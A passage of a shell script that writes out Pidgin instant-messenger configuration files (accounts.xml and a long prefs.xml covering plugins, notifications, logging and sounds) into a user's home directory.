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
SyuroWUIFzIAIlwN59KKKKyJP/2Q==&lt;/BINVAL&gt;&lt;/PHOTO&gt;&lt;/vCard&gt;</userinfo>
		<settings>
			<setting name='bosh_url' type='string'></setting>
			<setting name='auth_plain_in_clear' type='bool'>0</setting>
			<setting name='custom_smileys' type='bool'>1</setting>
			<setting name='port' type='int'>5222</setting>
			<setting name='connect_server' type='string'></setting>
			<setting name='ft_proxies' type='string'>proxy.eu.jabber.org</setting>
			<setting name='check-mail' type='bool'>0</setting>
			<setting name='connection_security' type='string'>opportunistic_tls</setting>
			<setting name='use-global-buddyicon' type='bool'>1</setting>
			<setting name='silence-suppression' type='bool'>0</setting>
		</settings>
		<settings ui='gtk-gaim'>
			<setting name='auto-login' type='bool'>1</setting>
		</settings>
		<current_error/>
	</account>
</account>
" >> $home/.purple/accounts.xml

}

f_writing_pidgin_accounts

rm -f prefs.xml
touch prefs.xml
echo "$home/.purple/prefs.xml" >> $file

f_writing_pidgin_prefs () {

echo "<?xml version='1.0' encoding='UTF-8' ?>

<pref version='1' name='/'>
	<pref name='purple'>
		<pref name='away'>
			<pref name='idle_reporting' type='string' value='system'/>
			<pref name='away_when_idle' type='bool' value='1'/>
			<pref name='mins_before_away' type='int' value='10'/>
			<pref name='auto_reply' type='string' value='awayidle'/>
		</pref>
		<pref name='buddies'/>
		<pref name='contact'>
			<pref name='last_match' type='bool' value='0'/>
		</pref>
		<pref name='logging'>
			<pref name='log_ims' type='bool' value='1'/>
			<pref name='log_chats' type='bool' value='1'/>
			<pref name='log_system' type='bool' value='1'/>
			<pref name='format' type='string' value='txt'/>
		</pref>
		<pref name='debug'>
			<pref name='timestamps' type='bool' value='1'/>
		</pref>
		<pref name='media'>
			<pref name='audio'>
				<pref name='silence_threshold' type='int' value='5'/>
				<pref name='volume'>
					<pref name='input' type='int' value='10'/>
					<pref name='output' type='int' value='10'/>
				</pref>
			</pref>
		</pref>
		<pref name='status'>
			<pref name='scores'>
				<pref name='offline' type='int' value='-500'/>
				<pref name='available' type='int' value='100'/>
				<pref name='invisible' type='int' value='-50'/>
				<pref name='away' type='int' value='-100'/>
				<pref name='extended_away' type='int' value='-200'/>
				<pref name='idle' type='int' value='0'/>
				<pref name='offline_msg' type='int' value='-5'/>
			</pref>
		</pref>
		<pref name='savedstatus'>
			<pref name='default' type='int' value='1335349856'/>
			<pref name='startup' type='int' value='0'/>
			<pref name='startup_current_status' type='bool' value='1'/>
			<pref name='idleaway' type='int' value='1335351070'/>
			<pref name='isidleaway' type='bool' value='0'/>
		</pref>
		<pref name='conversations'>
			<pref name='chat'>
				<pref name='show_nick_change' type='bool' value='1'/>
			</pref>
			<pref name='im'>
				<pref name='send_typing' type='bool' value='1'/>
			</pref>
		</pref>
		<pref name='network'>
			<pref name='stun_server' type='string' value=''/>
			<pref name='turn_server' type='string' value=''/>
			<pref name='turn_port' type='int' value='3478'/>
			<pref name='turn_port_tcp' type='int' value='3478'/>
			<pref name='turn_username' type='string' value=''/>
			<pref name='turn_password' type='string' value=''/>
			<pref name='auto_ip' type='bool' value='1'/>
			<pref name='public_ip' type='string' value=''/>
			<pref name='map_ports' type='bool' value='1'/>
			<pref name='ports_range_use' type='bool' value='0'/>
			<pref name='ports_range_start' type='int' value='1024'/>
			<pref name='ports_range_end' type='int' value='2048'/>
		</pref>
		<pref name='proxy'>
			<pref name='type' type='string' value='none'/>
			<pref name='host' type='string' value=''/>
			<pref name='port' type='int' value='0'/>
			<pref name='username' type='string' value=''/>
			<pref name='password' type='string' value=''/>
			<pref name='socks4_remotedns' type='bool' value='0'/>
		</pref>
		<pref name='sound'>
			<pref name='while_status' type='int' value='1'/>
		</pref>
	</pref>
	<pref name='plugins'>
		<pref name='core'>
			<pref name='musictracker'>
				<pref name='string_format' type='string' value='%r: %t by %p on %a (%d)'/>
				<pref name='string_off' type='string' value=''/>
				<pref name='string_paused' type='string' value='%r: Paused'/>
				<pref name='int_player' type='int' value='-1'/>
				<pref name='bool_disabled' type='bool' value='0'/>
				<pref name='bool_log' type='bool' value='0'/>
				<pref name='bool_filter' type='bool' value='0'/>
				<pref name='string_filter' type='string' value='fuck,suck,ass,bitch,dick,penis,porn,motherfucker'/>
				<pref name='string_mask' type='string' value='*'/>
				<pref name='bool_disable_when_away' type='bool' value='0'/>
				<pref name='bool_now_listening_only' type='bool' value='0'/>
				<pref name='string_xmms_sep' type='string' value='|'/>
				<pref name='string_mpd_hostname' type='string' value='localhost'/>
				<pref name='string_mpd_password' type='string' value=''/>
				<pref name='string_mpd_port' type='string' value='6600'/>
				<pref name='lastfm_user' type='string' value=''/>
				<pref name='lastfm_interval' type='int' value='120'/>
				<pref name='lastfm_quiet' type='int' value='600'/>
				<pref name='string_xmms2_path' type='string' value=''/>
				<pref name='string_squeezecenter_server' type='string' value='localhost:9090'/>
				<pref name='string_squeezecenter_user' type='string' value=''/>
				<pref name='string_squeezecenter_password' type='string' value=''/>
				<pref name='string_squeezecenter_players' type='string' value=''/>
				<pref name='bool_msn_swap' type='bool' value='0'/>
				<pref name='string_custom_francesco.1993@libero.it_MSN' type='string' value=''/>
				<pref name='bool_custom_francesco.1993@libero.it_MSN' type='bool' value='0'/>
				<pref name='bool_broken_now_listening_francesco.1993@libero.it_MSN' type='bool' value='0'/>
				<pref name='string_custom_darkeffe93@chat.facebook.com_XMPP' type='string' value=''/>
				<pref name='bool_custom_darkeffe93@chat.facebook.com_XMPP' type='bool' value='0'/>
				<pref name='bool_broken_now_listening_darkeffe93@chat.facebook.com_XMPP' type='bool' value='1'/>
			</pref>
			<pref name='plugin_pack'>
				<pref name='plonkers'>
					<pref name='plonkers'>
						<pref name='format_singular' type='string' value='/me has identified %N plonker: %P.'/>
						<pref name='format_plural' type='string' value='/me has identified %N plonkers: %P.'/>
					</pref>
					<pref name='plonked'>
						<pref name='format_singular' type='string' value='/me plonks: %P.'/>
						<pref name='format_plural' type='string' value='/me plonks: %P.'/>
					</pref>
				</pref>
			</pref>
			<pref name='pidgin_pp'/>
			<pref name='statenotify'>
				<pref name='notify_away' type='bool' value='1'/>
				<pref name='notify_idle' type='bool' value='1'/>
				<pref name='notify_signon' type='bool' value='1'/>
			</pref>
			<pref name='highlight'>
				<pref name='words' type='string' value=''/>
			</pref>
			<pref name='core-plugin_pack-autoaccept'>
				<pref name='path' type='string' value='/home/darkeffe/.purple/autoaccept'/>
				<pref name='notify' type='bool' value='1'/>
				<pref name='newdir' type='bool' value='1'/>
				<pref name='escape' type='bool' value='1'/>
			</pref>
			<pref name='core-plugin_pack-autoreply'>
				<pref name='idle' type='bool' value='1'/>
				<pref name='away' type='bool' value='1'/>
				<pref name='global' type='string' value='I am currently not available. Please leave your message, and I will get back to you as soon as possible.'/>
				<pref name='mintime' type='int' value='10'/>
				<pref name='maxsend' type='int' value='10'/>
				<pref name='usestatus' type='int' value='0'/>
				<pref name='prefix' type='string' value='This is an autoreply: '/>
				<pref name='invisible' type='bool' value='1'/>
			</pref>
			<pref name='core-plugin_pack-colorize'>
				<pref name='initial_r' type='int' value='255'/>
				<pref name='initial_g' type='int' value='0'/>
				<pref name='initial_b' type='int' value='0'/>
				<pref name='target_r' type='int' value='0'/>
				<pref name='target_g' type='int' value='0'/>
				<pref name='target_b' type='int' value='0'/>
			</pref>
			<pref name='psychic'>
				<pref name='buddies_only' type='bool' value='0'/>
				<pref name='show_notice' type='bool' value='1'/>
				<pref name='activate_online' type='bool' value='1'/>
			</pref>
			<pref name='slashexec'>
				<pref name='slash' type='bool' value='1'/>
				<pref name='bang' type='bool' value='0'/>
			</pref>
			<pref name='newline'>
				<pref name='im' type='bool' value='1'/>
				<pref name='chat' type='bool' value='1'/>
			</pref>
			<pref name='joinpart'>
				<pref name='delay' type='int' value='10'/>
				<pref name='threshold' type='int' value='20'/>
				<pref name='hide_buddies' type='bool' value='0'/>
			</pref>
			<pref name='core-plugin_pack-offlinemsg'>
				<pref name='always' type='bool' value='0'/>
			</pref>
			<pref name='splitter'>
				<pref name='split_size' type='int' value='786'/>
				<pref name='delay_ms' type='int' value='500'/>
			</pref>
			<pref name='twitgin'>
				<pref name='reply_link' type='bool' value='1'/>
				<pref name='fav_link' type='bool' value='1'/>
				<pref name='rt_link' type='bool' value='1'/>
				<pref name='ms_link' type='bool' value='1'/>
				<pref name='avatar_size' type='int' value='24'/>
			</pref>
		</pref>
		<pref name='lopl'/>
		<pref name='prpl'>
			<pref name='oscar'>
				<pref name='recent_buddies' type='bool' value='0'/>
			</pref>
			<pref name='meanwhile'>
				<pref name='blist_action' type='int' value='4'/>
			</pref>
		</pref>
		<pref name='gtk'>
			<pref name='X11'>
				<pref name='notify'>
					<pref name='type_im' type='bool' value='1'/>
					<pref name='type_chat' type='bool' value='0'/>
					<pref name='type_focused' type='bool' value='0'/>
					<pref name='method_string' type='bool' value='0'/>
					<pref name='title_string' type='string' value='(*)'/>
					<pref name='method_urgent' type='bool' value='1'/>
					<pref name='method_count' type='bool' value='0'/>
					<pref name='notify_focus' type='bool' value='1'/>
					<pref name='notify_click' type='bool' value='1'/>
					<pref name='notify_type' type='bool' value='1'/>
					<pref name='notify_send' type='bool' value='1'/>
					<pref name='notify_switch' type='bool' value='1'/>
					<pref name='type_chat_nick' type='bool' value='0'/>
					<pref name='method_count_xprop' type='bool' value='0'/>
					<pref name='method_raise' type='bool' value='0'/>
					<pref name='method_present' type='bool' value='0'/>
				</pref>
				<pref name='gestures'>
					<pref name='visual' type='bool' value='0'/>
				</pref>
			</pref>
			<pref name='infopane'>
				<pref name='position' type='string' value='top'/>
				<pref name='drag' type='bool' value='0'/>
				<pref name='single' type='bool' value='1'/>
				<pref name='icon' type='bool' value='1'/>
			</pref>
			<pref name='gtk-plugin_pack-convcolors'>
				<pref name='ignore_incoming' type='bool' value='1'/>
				<pref name='chats' type='bool' value='1'/>
				<pref name='ims' type='bool' value='1'/>
				<pref name='send'>
					<pref name='color' type='string' value='#909090'/>
					<pref name='format' type='int' value='0'/>
					<pref name='enabled' type='bool' value='1'/>
				</pref>
				<pref name='recv'>
					<pref name='color' type='string' value='#000000'/>
					<pref name='format' type='int' value='0'/>
					<pref name='enabled' type='bool' value='1'/>
				</pref>
				<pref name='system'>
					<pref name='color' type='string' value='#50a050'/>
					<pref name='format' type='int' value='2'/>
					<pref name='enabled' type='bool' value='1'/>
				</pref>
				<pref name='error'>
					<pref name='color' type='string' value='#ff0000'/>
					<pref name='format' type='int' value='5'/>
					<pref name='enabled' type='bool' value='1'/>
				</pref>
				<pref name='nick'>
					<pref name='color' type='string' value='#0000dd'/>
					<pref name='format' type='int' value='1'/>
					<pref name='enabled' type='bool' value='1'/>
				</pref>
			</pref>
			<pref name='gtk-plugin_pack-mystatusbox'>
				<pref name='pane' type='int' value='300'/>
				<pref name='global' type='bool' value='0'/>
				<pref name='show' type='int' value='0'/>
				<pref name='iconsel' type='bool' value='0'/>
			</pref>
			<pref name='amc_grim'>
				<pref name='blistops'>
					<pref name='hidelist' type='bool' value='0'/>
					<pref name='hidemenu' type='bool' value='0'/>
					<pref name='stretch' type='bool' value='1'/>
					<pref name='email' type='bool' value='0'/>
				</pref>
				<pref name='guifications2'>
					<pref name='behavior'>
						<pref name='display_time' type='int' value='6'/>
						<pref name='throttle' type='int' value='6'/>
						<pref name='show_while_away' type='bool' value='1'/>
					</pref>
					<pref name='appearance'>
						<pref name='position' type='int' value='3'/>
						<pref name='vertical' type='bool' value='1'/>
						<pref name='animate' type='bool' value='1'/>
					</pref>
					<pref name='mouse'>
						<pref name='left' type='string' value='open'/>
						<pref name='middle' type='string' value='close'/>
						<pref name='right' type='string' value='context'/>
					</pref>
					<pref name='themes' type='stringlist'>
						<item value='/usr/share/pixmaps/pidgin/guifications/themes/default/theme.xml'/>
					</pref>
					<pref name='advanced'>
						<pref name='release_notification' type='bool' value='0'/>
						<pref name='release_last_check' type='int' value='0'/>
						<pref name='screen' type='int' value='0'/>
						<pref name='monitor' type='int' value='0'/>
					</pref>
				</pref>
			</pref>
			<pref name='musicmessaging'>
				<pref name='editor_path' type='string' value='/usr/bin/gscore'/>
			</pref>
			<pref name='plugin_pack'>
				<pref name='enhanced_history'>
					<pref name='number' type='int' value='10'/>
					<pref name='bytes' type='int' value='4096'/>
					<pref name='minutes' type='int' value='0'/>
					<pref name='hours' type='int' value='0'/>
					<pref name='days' type='int' value='0'/>
					<pref name='dates' type='bool' value='1'/>
					<pref name='im' type='bool' value='1'/>
					<pref name='chat' type='bool' value='0'/>
				</pref>
			</pref>
			<pref name='kstange'>
				<pref name='extendedprefs'>
					<pref name='conv_show_joinpart' type='bool' value='1'/>
					<pref name='conv_size' type='int' value='8'/>
					<pref name='popup_size' type='int' value='8'/>
					<pref name='log_size' type='int' value='8'/>
					<pref name='blist_size' type='int' value='8'/>
					<pref name='blist_taskbar' type='bool' value='1'/>
					<pref name='blist_allow_shrink' type='bool' value='0'/>
					<pref name='blist_autohide' type='bool' value='0'/>
					<pref name='blist_tooltip' type='bool' value='0'/>
				</pref>
			</pref>
			<pref name='timestamp'>
				<pref name='interval' type='int' value='300000'/>
			</pref>
			<pref name='timestamp_format'>
				<pref name='force' type='string' value='default'/>
				<pref name='use_dates'>
					<pref name='conversation' type='string' value='automatic'/>
					<pref name='log' type='string' value='automatic'/>
				</pref>
			</pref>
			<pref name='cap'>
				<pref name='max_seen_difference' type='int' value='1'/>
				<pref name='max_msg_difference' type='int' value='10'/>
				<pref name='threshold' type='int' value='5'/>
			</pref>
			<pref name='gtk-plugin_pack-nicksaid'>
				<pref name='hlwords' type='string' value=''/>
				<pref name='chars' type='int' value='15'/>
				<pref name='timestamp' type='bool' value='1'/>
				<pref name='datestamp' type='bool' value='0'/>
				<pref name='showwho' type='bool' value='1'/>
				<pref name='showall' type='bool' value='0'/>
			</pref>
			<pref name='gtk-plugin_pack-markerline'>
				<pref name='ims' type='bool' value='0'/>
				<pref name='chats' type='bool' value='1'/>
			</pref>
			<pref name='gtk-plugin_pack-xchat-chats'>
				<pref name='date_format' type='string' value='[%H:%M]'/>
			</pref>
			<pref name='extplacement'>
				<pref name='placement_number' type='int' value='4'/>
				<pref name='placement_number_separate' type='bool' value='0'/>
			</pref>
			<pref name='purplerc'>
				<pref name='set'>
					<pref name='gtk-font-name' type='bool' value='0'/>
					<pref name='gtk-key-theme-name' type='bool' value='0'/>
					<pref name='color'>
						<pref name='GtkIMHtml::hyperlink-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::hyperlink-visited-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::send-name-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::receive-name-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::highlight-name-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::action-name-color' type='bool' value='0'/>
						<pref name='GtkIMHtml::typing-notification-color' type='bool' value='0'/>
					</pref>
					<pref name='size'>
						<pref name='GtkTreeView::horizontal_separator' type='bool' value='0'/>
					</pref>
					<pref name='font'>
						<pref name='*pidgin_conv_entry' type='bool' value='0'/>
						<pref name='*pidgin_conv_imhtml' type='bool' value='0'/>
						<pref name='*pidgin_request_imhtml' type='bool' value='0'/>
						<pref name='*pidgin_notify_imhtml' type='bool' value='0'/>
					</pref>
					<pref name='disable-typing-notification' type='bool' value='0'/>
				</pref>
				<pref name='gtk-font-name' type='string' value=''/>
				<pref name='gtk-key-theme-name' type='string' value=''/>
				<pref name='color'>
					<pref name='GtkIMHtml::hyperlink-color' type='string' value=''/>
					<pref name='GtkIMHtml::hyperlink-visited-color' type='string' value=''/>
					<pref name='GtkIMHtml::send-name-color' type='string' value=''/>
					<pref name='GtkIMHtml::receive-name-color' type='string' value=''/>
					<pref name='GtkIMHtml::highlight-name-color' type='string' value=''/>
					<pref name='GtkIMHtml::action-name-color' type='string' value=''/>
					<pref name='GtkIMHtml::typing-notification-color' type='string' value=''/>
				</pref>
				<pref name='size'>
					<pref name='GtkTreeView::horizontal_separator' type='int' value='0'/>
				</pref>
				<pref name='font'>
					<pref name='*pidgin_conv_entry' type='string' value=''/>
					<pref name='*pidgin_conv_imhtml' type='string' value=''/>
					<pref name='*pidgin_request_imhtml' type='string' value=''/>
					<pref name='*pidgin_notify_imhtml' type='string' value=''/>
				</pref>
				<pref name='disable-typing-notification' type='bool' value='0'/>
			</pref>
			<pref name='autoprofile'>
				<pref name='widgets'>
					<pref name='42'>
						<pref name='component' type='string' value='Timestamp'/>
						<pref name='alias' type='string' value='Timestamp'/>
						<pref name='timestamp_format' type='string' value='Automatically created at %I:%M %p'/>
					</pref>
					<pref name='widget_ids' type='stringlist'>
						<item value='42'/>
					</pref>
				</pref>
				<pref name='autorespond'>
					<pref name='auto_reply' type='string' value='awayidle'/>
					<pref name='text' type='string' value='Say the magic word if you want me to talk more!'/>
					<pref name='trigger' type='string' value='please'/>
					<pref name='delay' type='int' value='2'/>
					<pref name='enable' type='bool' value='1'/>
				</pref>
				<pref name='delay_update' type='int' value='30'/>
				<pref name='show_summary' type='string' value='always'/>
				<pref name='queue_messages_when_away' type='bool' value='0'/>
				<pref name='away_when_idle' type='bool' value='1'/>
				<pref name='profile_accounts' type='stringlist'/>
				<pref name='profile' type='string' value='Get AutoProfile for Purple at &lt;a href=&quot;http://autoprofile.sourceforge.net/&quot;&gt;autoprofile.sourceforge.net&lt;/a&gt;&lt;br&gt;&lt;br&gt;[Timestamp]'/>
			</pref>
			<pref name='libnotify'>
				<pref name='blocked_nicks' type='stringlist'>
					<item value='NickServ'/>
					<item value='ChanServ'/>
					<item value='MsgServ'/>
					<item value='freenode-connect'/>
				</pref>
				<pref name='newmsg' type='bool' value='1'/>
				<pref name='blocked' type='bool' value='1'/>
				<pref name='newconvonly' type='bool' value='0'/>
				<pref name='signon' type='bool' value='1'/>
				<pref name='signoff' type='bool' value='0'/>
				<pref name='only_available' type='bool' value='0'/>
				<pref name='auto_loaded' type='bool' value='1'/>
			</pref>
		</pref>
		<pref name='pidgin_audacious'>
			<pref name='process_status' type='bool' value='1'/>
			<pref name='process_userinfo' type='bool' value='1'/>
			<pref name='process_alias' type='bool' value='1'/>
		</pref>
		<pref name='pidgin_twitter'>
			<pref name='translate_recipient' type='bool' value='1'/>
			<pref name='translate_sender' type='bool' value='1'/>
			<pref name='translate_channel' type='bool' value='1'/>
			<pref name='escape_pseudo' type='bool' value='0'/>
			<pref name='strip_excess_lf' type='bool' value='1'/>
			<pref name='playsound_recipient' type='bool' value='1'/>
			<pref name='playsound_sender' type='bool' value='1'/>
			<pref name='soundid_recipient' type='int' value='9'/>
			<pref name='userlist_recipient' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='soundid_sender' type='int' value='9'/>
			<pref name='userlist_sender' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='counter' type='bool' value='1'/>
			<pref name='suppress_oops' type='bool' value='1'/>
			<pref name='prevent_notification' type='bool' value='0'/>
			<pref name='api_base_post' type='bool' value='1'/>
			<pref name='api_base_get_interval' type='int' value='60'/>
			<pref name='retrieve_count' type='int' value='20'/>
			<pref name='screen_name_twitter' type='string' value=''/>
			<pref name='password_twitter' type='string' value=''/>
			<pref name='screen_name_wassr' type='string' value=''/>
			<pref name='screen_name_identica' type='string' value=''/>
			<pref name='screen_name_jisko' type='string' value=''/>
			<pref name='screen_name_ffeed' type='string' value=''/>
			<pref name='show_icon' type='bool' value='1'/>
			<pref name='icon_size' type='int' value='48'/>
			<pref name='update_icon' type='bool' value='1'/>
			<pref name='icon_max_count' type='int' value='50'/>
			<pref name='icon_max_days' type='int' value='7'/>
			<pref name='log_output' type='bool' value='0'/>
			<pref name='filter' type='bool' value='1'/>
			<pref name='filter_exclude_reply' type='bool' value='1'/>
			<pref name='filter_twitter' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='filter_wassr' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='filter_identica' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='filter_jisko' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='filter_ffeed' type='string' value='(list of users: separated with &apos; ,:;&apos;)'/>
			<pref name='icon_dir' type='string' value='/home/darkeffe/.purple/pidgin-twitter/icons'/>
		</pref>
		<pref name='gtk-rlaager-album'>
			<pref name='window_height' type='int' value='258'/>
			<pref name='window_width' type='int' value='362'/>
			<pref name='icon_size' type='int' value='1'/>
		</pref>
		<pref name='ignore'>
			<pref name='rules' type='stringlist'/>
		</pref>
	</pref>
	<pref name='pidgin'>
		<pref name='browsers'>
			<pref name='browser' type='string' value='custom'/>
			<pref name='place' type='int' value='0'/>
			<pref name='manual_command' type='string' value='sensible-browser'/>
		</pref>
		<pref name='plugins'>
			<pref name='loaded' type='pathlist'>
				<item value='/usr/lib/purple-2/colorize.so'/>
				<item value='/usr/lib/pidgin/convcolors.so'/>
				<item value='/usr/lib/pidgin/libextprefs.so'/>
				<item value='/usr/lib/pidgin/musictracker.so'/>
				<item value='/usr/lib/purple-2/ssl-nss.so'/>
				<item value='/usr/lib/purple-2/pidgin-libnotify.so'/>
				<item value='/usr/lib/pidgin/pidginrc.so'/>
				<item value='/usr/lib/pidgin/themeedit.so'/>
				<item value='/usr/lib/purple-2/psychic.so'/>
				<item value='/usr/lib/purple-2/ssl.so'/>
				<item value='/usr/lib/purple-2/sslinfo.so'/>
				<item value='/usr/lib/pidgin/sendbutton.so'/>
				<item value='/usr/lib/purple-2/twitgin.so'/>
			</pref>
			<pref name='gtk-plugin_pack-irssi'>
				<pref name='textfmt' type='bool' value='1'/>
				<pref name='datechange' type='bool' value='1'/>
				<pref name='happynewyear' type='bool' value='0'/>
			</pref>
		</pref>
		<pref name='filelocations'>
			<pref name='last_save_folder' type='path' value=''/>
			<pref name='last_open_folder' type='path' value=''/>
			<pref name='last_icon_folder' type='path' value=''/>
		</pref>
		<pref name='smileys'>
			<pref name='theme' type='string' value='Default'/>
		</pref>
		<pref name='debug'>
			<pref name='enabled' type='bool' value='0'/>
			<pref name='filterlevel' type='int' value='0'/>
			<pref name='style' type='int' value='3'/>
			<pref name='toolbar' type='bool' value='1'/>
			<pref name='width' type='int' value='450'/>
			<pref name='height' type='int' value='250'/>
			<pref name='regex' type='string' value=''/>
			<pref name='filter' type='bool' value='0'/>
			<pref name='invert' type='bool' value='0'/>
			<pref name='case_insensitive' type='bool' value='0'/>
			<pref name='highlight' type='bool' value='0'/>
		</pref>
		<pref name='status'>
			<pref name='icon-theme' type='string' value=''/>
			<pref name='icon-theme-dir' type='path' value=''/>
			<pref name='dialog'>
				<pref name='width' type='int' value='550'/>
				<pref name='height' type='int' value='250'/>
			</pref>
		</pref>
		<pref name='stock'>
			<pref name='icon-theme' type='string' value=''/>
			<pref name='icon-theme-dir' type='path' value=''/>
		</pref>
		<pref name='sound'>
			<pref name='enabled'>
				<pref name='login' type='bool' value='1'/>
				<pref name='logout' type='bool' value='0'/>
				<pref name='im_recv' type='bool' value='1'/>
				<pref name='first_im_recv' type='bool' value='0'/>
				<pref name='send_im' type='bool' value='1'/>
				<pref name='join_chat' type='bool' value='0'/>
				<pref name='left_chat' type='bool' value='0'/>
				<pref name='send_chat_msg' type='bool' value='0'/>
				<pref name='chat_msg_recv' type='bool' value='0'/>
				<pref name='nick_said' type='bool' value='1'/>
				<pref name='pounce_default' type='bool' value='1'/>
				<pref name='sent_attention' type='bool' value='1'/>
				<pref name='got_attention' type='bool' value='1'/>
			</pref>
			<pref name='file'>
				<pref name='login' type='path' value=''/>
				<pref name='logout' type='path' value=''/>
				<pref name='im_recv' type='path' value=''/>
				<pref name='first_im_recv' type='path' value=''/>
				<pref name='send_im' type='path' value=''/>
				<pref name='join_chat' type='path' value=''/>
				<pref name='left_chat' type='path' value=''/>
				<pref name='send_chat_msg' type='path' value=''/>
				<pref name='chat_msg_recv' type='path' value=''/>
				<pref name='nick_said' type='path' value=''/>
				<pref name='pounce_default' type='path' value=''/>
				<pref name='sent_attention' type='path' value=''/>
				<pref name='got_attention' type='path' value=''/>
			</pref>
			<pref name='theme' type='string' value=''/>
			<pref name='conv_focus' type='bool' value='1'/>
			<pref name='mute' type='bool' value='0'/>
			<pref name='command' type='path' value=''/>
			<pref name='method' type='string' value='automatic'/>
			<pref name='volume' type='int' value='100'/>
		</pref>
		<pref name='accounts'>
			<pref name='dialog'>
				<pref name='width' type='int' value='520'/>
				<pref name='height' type='int' value='321'/>
			</pref>
			<pref name='buddyicon' type='path' value=''/>
		</pref>
		<pref name='blist'>
			<pref name='show_buddy_icons' type='bool' value='1'/>
			<pref name='show_empty_groups' type='bool' value='0'/>
			<pref name='show_idle_time' type='bool' value='1'/>
			<pref name='show_offline_buddies' type='bool' value='0'/>
			<pref name='show_protocol_icons' type='bool' value='0'/>
			<pref name='list_visible' type='bool' value='0'/>
			<pref name='list_maximized' type='bool' value='0'/>
			<pref name='sort_type' type='string' value='alphabetical'/>
			<pref name='x' type='int' value='0'/>
			<pref name='y' type='int' value='30'/>
			<pref name='width' type='int' value='250'/>
			<pref name='height' type='int' value='405'/>
			<pref name='theme' type='string' value=''/>
		</pref>
		<pref name='conversations'>
			<pref name='use_smooth_scrolling' type='bool' value='1'/>
			<pref name='close_on_tabs' type='bool' value='1'/>
